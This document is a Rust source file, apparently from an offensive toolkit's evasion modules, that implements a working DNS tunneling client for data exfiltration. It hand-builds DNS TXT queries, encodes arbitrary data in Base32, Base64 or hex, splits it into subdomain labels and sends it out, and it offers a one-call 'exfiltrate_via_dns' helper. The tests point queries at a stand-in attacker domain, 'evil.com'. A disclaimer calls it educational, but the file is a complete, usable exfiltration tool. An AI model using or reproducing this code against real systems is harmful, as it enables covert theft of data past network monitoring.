//! DNS Tunneling Module
//!
//! Provides data exfiltration via DNS queries:
//! - TXT record encoding
//! - Subdomain encoding
//! - Chunked data transmission
//! - Base32/Base64 encoding for DNS-safe characters
//!
//! WARNING: DNS tunneling is highly detectable by modern security tools.
//! Use only for educational/defensive research purposes.

use std::net::UdpSocket;
use std::time::Duration;

use crate::module::evasion::errors::EvasionError;

/// DNS tunneling configuration
#[derive(Debug, Clone)]
pub struct DnsTunnelConfig {
    /// Base domain for tunneling (e.g., "evil.com")
    pub base_domain: String,
    /// DNS server to query (default: 8.8.8.8)
    pub dns_server: String,
    /// Query timeout
    pub timeout: Duration,
    /// Maximum subdomain length (DNS label limit is 63)
    pub max_label_length: usize,
    /// Encoding method
    pub encoding: DnsEncoding,
}

impl Default for DnsTunnelConfig {
    fn default() -> Self {
        Self {
            base_domain: String::new(),
            dns_server: "8.8.8.8:53".to_string(),
            timeout: Duration::from_secs(5),
            max_label_length: 50,
            encoding: DnsEncoding::Base32,
        }
    }
}

/// DNS encoding methods
#[derive(Debug, Clone, Copy)]
pub enum DnsEncoding {
    Base32,
    Base64,
    Hex,
}

/// DNS tunneling client
pub struct DnsTunnel {
    config: DnsTunnelConfig,
    socket: UdpSocket,
    query_id: std::cell::Cell<u16>,
}

impl DnsTunnel {
    /// Create a new DNS tunnel client
    pub fn new(config: DnsTunnelConfig) -> Result<Self, EvasionError> {
        if config.base_domain.is_empty() {
            return Err(EvasionError::Internal(
                "Base domain is required".to_string(),
            ));
        }

        let socket = UdpSocket::bind("0.0.0.0:0")
            .map_err(|e| EvasionError::Internal(format!("Failed to bind socket: {}", e)))?;
        socket
            .set_read_timeout(Some(config.timeout))
            .map_err(|e| EvasionError::Internal(format!("Failed to set timeout: {}", e)))?;
        socket
            .set_write_timeout(Some(config.timeout))
            .map_err(|e| EvasionError::Internal(format!("Failed to set timeout: {}", e)))?;

        Ok(Self {
            config,
            socket,
            query_id: std::cell::Cell::new(0),
        })
    }

    /// Send data via DNS tunneling
    /// Data is split into chunks and sent as subdomain queries
    pub fn send_data(&self, data: &[u8]) -> Result<(), EvasionError> {
        // Encode data
        let encoded = self.encode_data(data);

        // Split into DNS-safe chunks
        let chunks = self.chunk_data(&encoded);

        // Send each chunk as a DNS query
        for (i, chunk) in chunks.iter().enumerate() {
            let domain = self.build_query_domain(chunk, i, chunks.len());
            self.send_query(&domain)?;
        }

        Ok(())
    }

    /// Send a simple DNS TXT query
    pub fn send_query(&self, domain: &str) -> Result<Vec<u8>, EvasionError> {
        let query = self.build_dns_query(domain);

        self.socket
            .send_to(&query, &self.config.dns_server)
            .map_err(|e| EvasionError::Internal(format!("Failed to send DNS query: {}", e)))?;

        let mut buffer = [0u8; 512];
        let (len, _) = self
            .socket
            .recv_from(&mut buffer)
            .map_err(|e| EvasionError::Internal(format!("Failed to receive DNS response: {}", e)))?;

        Ok(buffer[..len].to_vec())
    }

    /// Encode data for DNS transmission
    fn encode_data(&self, data: &[u8]) -> String {
        match self.config.encoding {
            DnsEncoding::Base32 => self.base32_encode(data),
            DnsEncoding::Base64 => self.base64_encode(data),
            DnsEncoding::Hex => self.hex_encode(data),
        }
    }

    /// Chunk data into DNS-safe labels
    fn chunk_data(&self, encoded: &str) -> Vec<String> {
        encoded
            .chars()
            .collect::<Vec<_>>()
            .chunks(self.config.max_label_length)
            .map(|chunk| chunk.iter().collect())
            .collect()
    }

    /// Build full query domain
    fn build_query_domain(&self, chunk: &str, index: usize, total: usize) -> String {
        format!("{}.c{}-{}.{}", chunk, index, total, self.config.base_domain)
    }

    /// Build DNS query packet
    fn build_dns_query(&self, domain: &str) -> Vec<u8> {
        let mut query = Vec::new();

        // Transaction ID (2 bytes)
        let query_id = self.query_id.get().wrapping_add(1);
        self.query_id.set(query_id);
        query.extend_from_slice(&query_id.to_be_bytes());

        // Flags (2 bytes) - standard query
        query.extend_from_slice(&0x0100u16.to_be_bytes());

        // Questions (2 bytes)
        query.extend_from_slice(&1u16.to_be_bytes());

        // Answer RRs (2 bytes)
        query.extend_from_slice(&0u16.to_be_bytes());

        // Authority RRs (2 bytes)
        query.extend_from_slice(&0u16.to_be_bytes());

        // Additional RRs (2 bytes)
        query.extend_from_slice(&0u16.to_be_bytes());

        // Query domain
        for label in domain.split('.') {
            query.push(label.len() as u8);
            query.extend_from_slice(label.as_bytes());
        }

        // Null terminator
        query.push(0);

        // Query type (2 bytes) - TXT record (16)
        query.extend_from_slice(&16u16.to_be_bytes());

        // Query class (2 bytes) - IN (1)
        query.extend_from_slice(&1u16.to_be_bytes());

        query
    }

    /// Base32 encode (DNS-safe characters only)
    fn base32_encode(&self, data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
        let mut result = String::new();

        let mut buffer: u64 = 0;
        let mut bits_left = 0;

        for &byte in data {
            buffer = (buffer << 8) | (byte as u64);
            bits_left += 8;

            while bits_left >= 5 {
                bits_left -= 5;
                let index = (buffer >> bits_left) & 0x1F;
                result.push(ALPHABET[index as usize] as char);
            }
        }

        if bits_left > 0 {
            let index = (buffer << (5 - bits_left)) & 0x1F;
            result.push(ALPHABET[index as usize] as char);
        }

        result
    }

    /// Base64 encode (URL-safe variant)
    fn base64_encode(&self, data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        let mut result = String::new();

        for chunk in data.chunks(3) {
            let b0 = chunk[0] as usize;
            let b1 = chunk.get(1).copied().unwrap_or(0) as usize;
            let b2 = chunk.get(2).copied().unwrap_or(0) as usize;

            result.push(ALPHABET[(b0 >> 2) & 0x3F] as char);
            result.push(ALPHABET[((b0 << 4) | (b1 >> 4)) & 0x3F] as char);

            if chunk.len() > 1 {
                result.push(ALPHABET[((b1 << 2) | (b2 >> 6)) & 0x3F] as char);
            }
            if chunk.len() > 2 {
                result.push(ALPHABET[b2 & 0x3F] as char);
            }
        }

        result
    }

    /// Hex encode
    fn hex_encode(&self, data: &[u8]) -> String {
        data.iter().map(|b| format!("{:02x}", b)).collect()
    }
}

/// Simple DNS exfiltration helper
pub fn exfiltrate_via_dns(
    data: &[u8],
    base_domain: &str,
) -> Result<(), EvasionError> {
    let config = DnsTunnelConfig {
        base_domain: base_domain.to_string(),
        ..Default::default()
    };

    let tunnel = DnsTunnel::new(config)?;
    tunnel.send_data(data)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tunnel_or_skip(config: DnsTunnelConfig) -> Option<DnsTunnel> {
        match DnsTunnel::new(config) {
            Ok(tunnel) => Some(tunnel),
            Err(EvasionError::Internal(msg)) if msg.contains("Operation not permitted") => None,
            Err(err) => panic!("unexpected tunnel init failure: {err}"),
        }
    }

    #[test]
    fn test_dns_tunnel_creation() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            ..Default::default()
        };
        let _ = tunnel_or_skip(config);
    }

    #[test]
    fn test_dns_tunnel_requires_domain() {
        let config = DnsTunnelConfig::default();
        let tunnel = DnsTunnel::new(config);
        assert!(tunnel.is_err());
    }

    #[test]
    fn test_base32_encoding() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            encoding: DnsEncoding::Base32,
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let encoded = tunnel.base32_encode(b"Hello");
        assert!(!encoded.is_empty());
        // Base32 should only contain lowercase letters and 2-7
        for c in encoded.chars() {
            assert!(c.is_ascii_lowercase() || c.is_ascii_digit());
        }
    }

    #[test]
    fn test_base64_encoding() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            encoding: DnsEncoding::Base64,
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let encoded = tunnel.base64_encode(b"Hello");
        assert!(!encoded.is_empty());
    }

    #[test]
    fn test_hex_encoding() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            encoding: DnsEncoding::Hex,
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let encoded = tunnel.hex_encode(b"Hi");
        assert_eq!(encoded, "4869");
    }

    #[test]
    fn test_chunk_data() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            max_label_length: 10,
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let chunks = tunnel.chunk_data("abcdefghijklmnopqrstuvwxyz");
        assert_eq!(chunks.len(), 3);
        assert_eq!(chunks[0], "abcdefghij");
        assert_eq!(chunks[1], "klmnopqrst");
        assert_eq!(chunks[2], "uvwxyz");
    }

    #[test]
    fn test_build_query_domain() {
        let config = DnsTunnelConfig {
            base_domain: "evil.com".to_string(),
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let domain = tunnel.build_query_domain("abc123", 0, 3);
        assert!(domain.ends_with(".evil.com"));
        assert!(domain.contains("abc123"));
        assert!(domain.contains("c0-3"));
    }

    #[test]
    fn test_dns_query_building() {
        let config = DnsTunnelConfig {
            base_domain: "test.com".to_string(),
            ..Default::default()
        };
        let Some(tunnel) = tunnel_or_skip(config) else {
            return;
        };

        let query = tunnel.build_dns_query("sub.test.com");
        assert!(query.len() > 12); // Minimum DNS query size
    }
}
